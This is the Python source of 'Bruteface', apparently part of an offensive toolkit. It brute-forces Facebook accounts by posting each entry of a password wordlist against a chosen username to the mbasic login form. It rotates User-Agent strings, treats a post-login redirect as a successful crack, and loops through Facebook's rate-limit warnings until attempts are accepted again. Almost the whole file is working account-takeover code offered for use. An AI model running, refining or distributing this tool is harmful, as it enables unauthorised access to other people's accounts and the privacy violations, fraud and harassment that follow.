#!/usr/bin/python3
# -*- Author : Anonputraid -*-    
#
# Run Facebook Brute Force Application Features
# -*- Name : Bruteface. -*-
#

# Date: 13-06-2021


import json,os as system, requests, time , random,sys
from colorama import Fore as init_a, Back, Style as ini_a
from lib.core import api_printout as opt
from lib.core import api_printfail as opf
from lib.core import api_common
from lib.core import api_options
from bs4 import BeautifulSoup
from datetime import datetime



db = open("data/json/modules_metadata_base.json")
x = json.load(db)

def a1(init_b1,v,init_b3,index=50,total=50):
    try:
        start=datetime.now()
        init = "http-mbasic.facebook.indo"
        
        
        init_v2 = [
            "http-verboses"
        ]

        f = "http-characters"

        for a in range(0,1):
            b2 = random.choice(init_b3)

        headers = {'User-Agent': "{}".format(b2)}

        ini2 = "https://httpbin.org/headers"

        init_b2 = open(init_b1,"r")

        print(x[f]["c"])

        percentage = 0
        error = 0

        for b in init_b2:
            a = b.strip()
            n = {
                x[init]["username"]: v, 
                x[init]["password"]: a, 
                x[init]["dbbutton"]: 
                x[init]["dbsubmit"]
                }
            
            e = requests.post(x[init]["Target"], data=n, headers=headers)
            o = requests.get(ini2,headers=headers).json()

            init_db1 = e.url
            percentage += 1
            init_db2 = e.text

            if init_db1.find(x[init]["path-raw"]) != -1:
                print(f"✅ {n}")
                sys.exit(0) 	
            elif (init_db2.find('Kami membatasi seberapa sering Anda dapat memposting') != -1):
                percentage -= 1
                error += 1
                init_d = [
                    "http-warning"
                ]
                for b in init_d:
                    opf.printout(x[f]["c"] + x[b]["name"] + f"{error}" + x[f]["c"])

                print(x[f]["d"])
                opf.printout(x[b]["err_inf"] + x[f]["c"])

                words = True
                while words:
                    u = requests.post(x[init]["Target"], data=n, headers=headers).text
                    if (u.find('Nama pengguna atau kata sandi tidak valid') != -1):
                        words = False
            else:
                print("Request #{}".format(percentage))
                print(f"❌ {init_db1}")
                print(f"❌ {n}")
                print(f"❌ {o}".replace('httpbin.org',"mbasic.facebook.com"))
                print(x[f]["d"])

    except requests.ConnectionError as err:
        raise SystemExit(err)

def a2(init_b1,v,init_b3,index=50,total=50):
    try:
        start=datetime.now()

        db = {}

        init = "http-mbasic.facebook.indo"
        
        init_v2 = [
            "http-verboses"
        ]

        f = "http-characters"

        for a in range(0,1):
            b2 = random.choice(init_b3)

        headers = {'User-Agent': "{}".format(b2)}

        init_b2 = open(init_b1,"r")

        print(x[f]["c"])

        percentage = 0
        error = 0

        for b in init_b2:
            a = b.strip()
            n = {
                x[init]["username"]: v, 
                x[init]["password"]: a, 
                x[init]["dbbutton"]: 
                x[init]["dbsubmit"]
                }
            
            e = requests.post(x[init]["Target"], data=n, headers=headers)

            init_db1 = e.url
            percentage += 1
            init_db2 = e.text

            if init_db1.find(x[init]["path-raw"]) != -1:
                print(f"✅ Brute Force: {a} Time: [{datetime.now()-start}]",end="\r")
            elif (init_db2.find('Kami membatasi seberapa sering Anda dapat memposting') != -1):
                percentage -= 1
                error += 1
                init_d = [
                    "http-warning"
                ]
                for b in init_d:
                    opf.printout(x[f]["c"] + x[b]["name"] + f"{error}" + x[f]["c"])

                print(x[f]["d"])
                opf.printout(x[b]["err_inf"] + x[f]["c"])
                words = True
                while words:
                    u = requests.post(x[init]["Target"], data=n, headers=headers).text
                    if (u.find('Nama pengguna atau kata sandi tidak valid') != -1):
                        words = False
                    print(datetime.now()-start, end="\r")
            else:
                sys.stdout.write("❌ Brute Force: {} [{}]\r".format(a,percentage))
                sys.stdout.flush()
            
    except KeyboardInterrupt:
        pass
    except requests.ConnectionError as err:
        raise SystemExit(err)

def main_attack(T):
    try:
        init_v1 = [
            "http-header"
        ]

        init_v2 = [
            "http-setup"
        ]

        f = "http-characters"

        for a in init_v2:
            opt.printout(x[f]["c"] + x[a]["Target"] + x[f]["c"])


        v = input(init_a.YELLOW + "   Username : " + ini_a.RESET_ALL)

        print("]" + x[f]["c"])

        # print( 
        #     init_a.RED + "[TARGET]: " + init_a.GREEN + "{} ".format(v) +
        #     init_a.RED + "[DIRECT]: " + init_a.GREEN + "{} ".format(T) + init_a.RED + "[{}]".format(str(no))
        #     )

        O = input(x[f]["c"] + init_a.YELLOW + "Verbose Mode [Y/N] : " + ini_a.RESET_ALL)
        
        for c in init_v1:
            w = x[c]["references"]


        if O == "Y":
            a1(T,v,w)
        else:
            a2(T,v,w)
            pass


    except requests.ConnectionError as err:
        raise SystemExit(err)

    pass

def repeat_error():

    init_d = [
        "http-warning"
    ]

    f = "http-characters"

    db_main = input(x[f]["c"] + init_a.YELLOW + "🔥Insert Wordlists : " + ini_a.RESET_ALL).lower()

    if system.path.isfile(db_main):
        main_attack(db_main)
    else:
        for b in init_d:
            opf.printout(x[f]["c"] + x[b]["name"] + x[f]["c"])
            
        print(x[f]["d"])
        opf.printout(x[b]["err_msg"] + x[f]["c"])

        return repeat_error()

    pass

def interactive():
    try:
        value = [
            "http-setup"
        ]

        f = "http-characters"

        failed = [
            "http-warning"
        ]

        for a in value:
            opt.printout(x[f]["c"] + x[a]["Wordlists"] + x[f]["c"])

        db_main = input(init_a.YELLOW + "   Wordlist : " + ini_a.RESET_ALL).lower()

        if system.path.isfile(db_main):
            print("]")
            main_attack(db_main )
        else:
            print("]")
            for b in failed:
                opf.printout(x[f]["c"] + x[b]["name"] + x[f]["c"])
                
            print(x[f]["d"])
            opf.printout(x[b]["err_msg"] + x[f]["c"])

            repeat_error()
            

        print("")

    except KeyboardInterrupt:
        api_options.console()
        pass


def run():
    print("sudah dijalankan")
    pass
